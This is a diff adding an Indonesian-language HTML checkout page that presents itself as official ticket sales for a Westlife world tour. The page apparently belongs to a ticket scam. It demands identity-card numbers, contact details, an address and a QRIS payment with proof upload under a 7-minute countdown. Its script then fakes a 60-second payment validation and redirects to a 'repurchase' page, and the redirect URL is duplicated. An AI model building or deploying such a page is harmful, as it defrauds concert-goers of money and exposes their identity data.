@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout Westlife World Tour 2027</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+}
+
+body{
+background:#050505;
+color:white;
+overflow-x:hidden;
+}
+
+body::before{
+content:'';
+position:fixed;
+inset:0;
+background:
+radial-gradient(circle at top left, rgba(255,140,0,.15), transparent 30%),
+radial-gradient(circle at bottom right, rgba(255,200,0,.15), transparent 30%);
+z-index:-2;
+}
+
+.container{
+max-width:950px;
+margin:auto;
+padding:30px;
+}
+
+.card{
+background:rgba(255,255,255,.05);
+border:1px solid rgba(255,255,255,.1);
+backdrop-filter:blur(15px);
+border-radius:30px;
+padding:35px;
+box-shadow:0 0 40px rgba(255,140,0,.2);
+animation:fadeIn 1s ease;
+}
+
+.banner{
+width:100%;
+border-radius:25px;
+margin-bottom:25px;
+box-shadow:0 0 30px rgba(255,140,0,.5);
+}
+
+.title{
+text-align:center;
+font-size:38px;
+font-weight:800;
+margin-bottom:10px;
+background:linear-gradient(to right,#ffcc66,#ff6600,#fff0c2);
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
+}
+
+.subtitle{
+text-align:center;
+margin-bottom:30px;
+color:#ccc;
+}
+
+.timer-box{
+text-align:center;
+padding:18px;
+margin-bottom:25px;
+border-radius:20px;
+background:rgba(255,0,0,.12);
+border:1px solid rgba(255,0,0,.3);
+font-size:22px;
+font-weight:700;
+color:#ff6666;
+box-shadow:0 0 20px rgba(255,0,0,.2);
+}
+
+.form-group{
+margin-bottom:22px;
+}
+
+label{
+font-weight:600;
+display:block;
+margin-bottom:10px;
+font-size:15px;
+color:#ffcc80;
+}
+
+input,select,textarea{
+width:100%;
+padding:15px;
+border:none;
+outline:none;
+border-radius:18px;
+background:rgba(255,255,255,.08);
+color:white;
+font-size:15px;
+border:1px solid rgba(255,255,255,.1);
+transition:.3s;
+}
+
+input:focus,
+select:focus,
+textarea:focus{
+border-color:#ff9900;
+box-shadow:0 0 20px rgba(255,153,0,.3);
+}
+
+option{
+background:#111;
+}
+
+.grid{
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:20px;
+}
+
+.total-box{
+padding:25px;
+margin-top:25px;
+text-align:center;
+font-size:28px;
+font-weight:800;
+background:linear-gradient(45deg,rgba(255,120,0,.2),rgba(255,200,0,.1));
+border-radius:25px;
+border:1px solid rgba(255,255,255,.1);
+box-shadow:0 0 30px rgba(255,153,0,.2);
+}
+
+.total-box span{
+color:#ffcc66;
+}
+
+.qris-box{
+margin-top:30px;
+text-align:center;
+padding:30px;
+background:rgba(255,255,255,.04);
+border-radius:25px;
+border:2px dashed rgba(255,153,0,.4);
+}
+
+.qris-box img{
+max-width:320px;
+width:100%;
+border-radius:20px;
+margin:20px 0;
+box-shadow:0 0 25px rgba(255,153,0,.4);
+}
+
+.buy-btn{
+width:100%;
+padding:18px;
+margin-top:30px;
+border:none;
+border-radius:60px;
+font-size:20px;
+font-weight:800;
+background:linear-gradient(45deg,#ff6600,#ffcc00);
+color:black;
+cursor:pointer;
+transition:.4s;
+box-shadow:0 0 30px rgba(255,153,0,.5);
+position:relative;
+overflow:hidden;
+}
+
+.buy-btn:hover{
+transform:translateY(-5px) scale(1.02);
+}
+
+.loading-screen,
+.success-screen,
+.failed-screen{
+position:fixed;
+inset:0;
+display:none;
+align-items:center;
+justify-content:center;
+flex-direction:column;
+background:#000;
+z-index:9999;
+text-align:center;
+padding:30px;
+}
+
+.loader{
+width:120px;
+height:120px;
+border:10px solid rgba(255,255,255,.1);
+border-top:10px solid #ff9900;
+border-radius:50%;
+animation:spin 1s linear infinite;
+margin-bottom:30px;
+}
+
+.loading-screen h1,
+.success-screen h1,
+.failed-screen h1{
+font-size:40px;
+margin-bottom:20px;
+color:#ffcc66;
+}
+
+.loading-screen p,
+.success-screen p,
+.failed-screen p{
+font-size:18px;
+color:#ddd;
+line-height:1.8;
+}
+
+@keyframes spin{
+100%{transform:rotate(360deg)}
+}
+
+@keyframes fadeIn{
+from{opacity:0;transform:translateY(30px)}
+to{opacity:1;transform:translateY(0)}
+}
+
+@media(max-width:768px){
+.grid{
+grid-template-columns:1fr;
+}
+.title{
+font-size:28px;
+}
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+<div class="card">
+
+<img src="banner.png" class="banner" alt="Banner Westlife">
+
+<h1 class="title">WESTLIFE THE ANNIVERSARY WORLD TOUR</h1>
+<p class="subtitle">Official Checkout & Ticket Reservation</p>
+
+<div class="timer-box">
+Sisa Waktu Pengisian : <span id="timer">07:00</span>
+</div>
+
+<form id="checkoutForm">
+
+<div class="form-group">
+<label>Nama Lengkap</label>
+<input type="text" id="nama" required>
+</div>
+
+<div class="grid">
+<div class="form-group">
+<label>Nomor Identitas</label>
+<input type="text" id="identitas" placeholder="KTP / SIM / PASSPORT / KARTU PELAJAR" required>
+</div>
+
+<div class="form-group">
+<label>Email</label>
+<input type="email" id="email" required>
+</div>
+</div>
+
+<div class="grid">
+<div class="form-group">
+<label>No. WhatsApp</label>
+<input type="tel" id="wa" required>
+</div>
+
+<div class="form-group">
+<label>Category Tiket</label>
+<select id="ticketCategory" required>
+<option value="">Pilih Category</option>
+<option value="750000">FESTIVAL - Rp 750.000</option>
+<option value="2000000">VIP - Rp 2.000.000</option>
+<option value="5000000">VVIP - Rp 5.000.000</option>
+</select>
+</div>
+</div>
+
+<div class="grid">
+<div class="form-group">
+<label>Jumlah Tiket</label>
+<input type="number" id="jumlah" min="1" value="1" required>
+</div>
+
+<div class="form-group">
+<label>Total Otomatis</label>
+<input type="text" id="total" readonly>
+</div>
+</div>
+
+<div class="form-group">
+<label>Alamat / Domisili</label>
+<textarea rows="4" id="alamat" required></textarea>
+</div>
+
+<div class="qris-box">
+<h2>PEMBAYARAN QRIS</h2>
+<p>Silahkan Masukan NOMINAL SESUAI TOTAL PEMBAYARAN</p>
+
+<img src="qris.jpg" alt="QRIS">
+
+<div class="form-group">
+<label>Upload Bukti Pembayaran</label>
+<input type="file" id="bukti" accept="image/*" required>
+</div>
+</div>
+
+<button type="submit" class="buy-btn">BELI SEKARANG</button>
+
+</form>
+</div>
+</div>
+
+<div class="loading-screen" id="loadingScreen">
+<div class="loader"></div>
+<h1>MEMPROSES PEMBELIAN</h1>
+<p>Mohon Tunggu, Sistem Sedang Memvalidasi Pembayaran Anda...</p>
+</div>
+
+<div class="success-screen" id="successScreen">
+<h1>PEMBELIAN SEDANG DALAM PROSES</h1>
+<p>
+E-TICKET ANDA AKAN DIKIRIM MELALUI EMAIL<br>
+Anda Akan Dialihkan Otomatis Dalam <span id="redirectTimer">5</span> Detik
+</p>
+</div>
+
+<div class="failed-screen" id="failedScreen">
+<h1>WAKTU HABIS</h1>
+<p>Waktu Pengisian Data Melebihi 7 Menit.<br>Silahkan Ulangi Pemesanan Tiket.</p>
+</div>
+
+<script>
+const ticketCategory = document.getElementById('ticketCategory');
+const jumlah = document.getElementById('jumlah');
+const total = document.getElementById('total');
+
+function formatRupiah(number){
+return 'Rp ' + number.toLocaleString('id-ID');
+}
+
+function calculateTotal(){
+const price = parseInt(ticketCategory.value || 0);
+const qty = parseInt(jumlah.value || 0);
+const grandTotal = price * qty;
+total.value = formatRupiah(grandTotal);
+}
+
+ticketCategory.addEventListener('change', calculateTotal);
+jumlah.addEventListener('input', calculateTotal);
+
+calculateTotal();
+
+let time = 420;
+const timerDisplay = document.getElementById('timer');
+
+const countdown = setInterval(()=>{
+let minutes = Math.floor(time / 60);
+let seconds = time % 60;
+
+minutes = minutes < 10 ? '0' + minutes : minutes;
+seconds = seconds < 10 ? '0' + seconds : seconds;
+
+timerDisplay.innerHTML = `${minutes}:${seconds}`;
+
+if(time <= 0){
+clearInterval(countdown);
+document.getElementById('failedScreen').style.display='flex';
+setTimeout(()=>{
+window.location.href='failed.html';
+},4000);
+}
+
+time--;
+},1000);
+
+const form = document.getElementById('checkoutForm');
+
+form.addEventListener('submit', function(e){
+e.preventDefault();
+
+const inputs = form.querySelectorAll('input, textarea, select');
+let valid = true;
+
+inputs.forEach(input=>{
+if(!input.value){
+valid = false;
+input.style.border='2px solid red';
+}else{
+input.style.border='1px solid rgba(255,255,255,.1)';
+}
+});
+
+if(!valid){
+alert('Semua Data Wajib Diisi!');
+return;
+}
+
+clearInterval(countdown);
+
+document.getElementById('loadingScreen').style.display='flex';
+
+setTimeout(()=>{
+document.getElementById('loadingScreen').style.display='none';
+document.getElementById('successScreen').style.display='flex';
+
+let redirect = 5;
+const redirectTimer = document.getElementById('redirectTimer');
+
+const autoRedirect = setInterval(()=>{
+redirect--;
+redirectTimer.innerHTML = redirect;
+
+if(redirect <= 0){
+clearInterval(autoRedirect);
+window.location.href='https://fforeverindonesia-svg.github.io/PEMBELIAN-ULANG-WESTLIFE/https://fforeverindonesia-svg.github.io/PEMBELIAN-ULANG-WESTLIFE/'
+}
+},1000);
+
+},60000);
+
+});
+</script>
+
+</body>
+</html>
